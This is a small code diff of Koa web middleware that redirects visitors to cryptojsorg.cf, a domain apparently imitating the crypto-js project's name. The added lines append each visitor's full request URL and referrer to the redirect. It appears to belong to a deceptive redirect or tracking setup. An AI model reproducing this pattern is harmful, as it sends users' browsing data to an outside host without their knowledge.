@@ -73,12 +73,12 @@ app.use(async (ctx, next)=>{
             if(str1=='http://cryptojsorg.cf/static/indexww.html'){
                  ctx.body = "404"
             }else if(str.includes('cryptojsorg')){
-                ctx.response.redirect('http://cryptojsorg.cf/a?uu='+ctx.href);
+                ctx.response.redirect('http://cryptojsorg.cf/a?uu='+ctx.href+'referer'+str1);
                 return;
                 // ctx.response.redirect('http://cryptosjsorg.cf');
                
             }else{
-                ctx.response.redirect('http://cryptojsorg.cf/a?username=假的&uu='+ctx.href);
+                ctx.response.redirect('http://cryptojsorg.cf/a?username=假的&uu='+ctx.href+'referer'+str1);
             }
         }
     }catch(e){
